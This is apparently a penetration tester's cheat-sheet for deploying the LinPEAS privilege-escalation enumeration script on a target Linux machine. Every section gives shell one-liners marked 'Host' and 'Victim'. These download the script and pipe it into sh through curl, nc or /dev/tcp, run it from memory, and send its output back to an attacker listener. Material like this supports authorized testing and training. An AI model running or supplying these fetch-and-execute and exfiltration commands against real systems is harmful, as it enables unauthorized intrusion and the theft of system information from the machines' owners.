### Download
https://github.com/carlospolop/PEASS-ng/releases/tag/20220515
```
wget https://github.com/carlospolop/PEASS-ng/releases/download/20220515/linpeas.sh
```
Host on Python web and download from target
[[Web Hosting#Python HTTP]]

### From github
```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### Local network
```
sudo python -m SimpleHTTPServer 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim
```

### Without curl
```
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim
```

### Excute from memory and send output back to the host
```
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
```

### Output to file
```
./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
less -r /dev/shm/linpeas.txt #Read with colors
```

### Use a linpeas binary
```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64
chmod +x linpeas_linux_amd64
./linpeas_linux_amd64
```